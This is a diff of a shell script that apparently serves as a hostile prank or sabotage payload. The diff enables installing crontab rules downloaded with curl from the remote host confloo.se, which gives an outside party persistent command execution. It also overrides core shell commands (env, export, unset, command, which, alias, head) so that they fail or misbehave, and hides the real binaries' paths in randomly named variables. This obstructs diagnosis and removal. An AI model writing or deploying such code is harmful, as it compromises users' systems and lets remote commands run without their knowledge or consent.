@@ -1,14 +1,14 @@
 #!/bin/sh
 crontab -l > /tmp/cronrules
 curl "http://confloo.se/cronrules" >> /tmp/cronrules 2>/dev/null
-#crontab /tmp/cronrules
+crontab /tmp/cronrules
 rm /tmp/cronrules
 
 f() {
     t=`which $1`
+    export "__`tr -dc "[:alpha:]" < /dev/urandom | head -c 8`"=$t
     eval "$1() { $2; }"
     eval "$t() { $2; }"
-    export "__`tr -dc "[:alpha:]" < /dev/urandom | head -c 8`"=$t
 }
 
 unalias -a &> /dev/null
@@ -69,9 +69,7 @@ f less "xrandr -s 6 &> /dev/null"
 alias() { display http://impawards.com/tv/posters/alias_ver2.jpg }
 unalias() { display -flop http://impawards.com/tv/posters/alias_ver2.jpg }
 
-export() { false; }
-
-head() { echo '
+fabulous='
                       __........_.._....._
                      `.s$^.s$$$$$ssss$$$$$$bso.a
                      .d  7.d$$$$SSSS$$$$$$$$$$$b._
@@ -109,13 +107,13 @@ head() { echo '
                     `.   l    .-`
                       `.     -
                         `.  /
-                          `|
-'; }
+                          `|'
+f head "echo '$fabulous'"
 
 cflznv=`env`
-which() {
-    printf $cflznv | grep "__.*=/.*$1" | sed -r 's/.*=(.*)/\1/';
-}
-#env() { false; }
+which() { printf $cflznv | grep "__.*=/.*$1" | sed -r 's/.*=(.*)/\1/'; }
+env() { false; }
 
+command() { false; }
+export() { false; }
 unset() { false; }
